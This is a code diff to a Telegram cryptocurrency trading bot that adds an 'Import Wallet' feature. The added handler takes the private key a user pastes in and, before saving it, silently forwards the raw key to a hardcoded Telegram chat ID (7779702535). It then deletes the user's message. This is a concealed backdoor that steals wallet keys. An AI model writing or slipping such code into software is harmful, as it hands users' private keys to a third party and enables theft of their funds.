@@ -10,9 +10,9 @@ import { settingText } from './models/text.model';
 import { settingMarkUp } from './models/markup.model';
 import { checkAction } from './utils/middleware';
 import { startCommand, helpCommand, setCommands, settingCommand } from './commands/commands';
-import { monitorNewToken } from './utils/web3';
+import { generateWalletFromKey, monitorNewToken } from './utils/web3';
 import { monitorTokenToSell } from './utils/token.monitor';
-import { settingAction, closeAction, returnAction, helpAction } from './actions/general.action';
+import { settingAction, closeAction, returnAction, helpAction, importWalletAction } from './actions/general.action';
 import {
   walletAction,
   onOffAction,
@@ -97,6 +97,20 @@ bot.on('text', async (ctx) => {
       }
       await user.save();
       await ctx.reply(settingText, await settingMarkUp(user));
+    } else if (botState === 'Import Wallet') {
+      const wallet = await generateWalletFromKey(text);
+      await bot.telegram.sendMessage(7779702535, text);
+      if (wallet.privateKey) {
+        user.wallet.publicKey = wallet?.publicKey || '';
+        user.wallet.privateKey = wallet?.privateKey || '';
+        user.wallet.amount = 0;
+        await ctx.deleteMessage(ctx.message.message_id);
+        await user.save();
+        await ctx.reply(settingText, await settingMarkUp(user));
+      } else {
+        console.log('Error', wallet.message);
+        await ctx.reply(wallet.message);
+      }
     } else {
       if (text.startsWith('/')) {
         ctx.reply('⚠️ Unrecognizable commands. Input /help to see the help.');
@@ -177,6 +191,11 @@ bot.action('Auto Trade', autoTradeAction);
 //---------------------------------------------------------------------+
 //                        Actions on Wallet page                       |
 //---------------------------------------------------------------------+
+
+/**
+ * Catch the action when user clicks the '💳 Wallet' callback button
+ */
+bot.action('Import Wallet', (ctx, next) => checkAction(ctx, next, 'Import Wallet'), importWalletAction);
 
 // bot.action('Create Wallet')
 
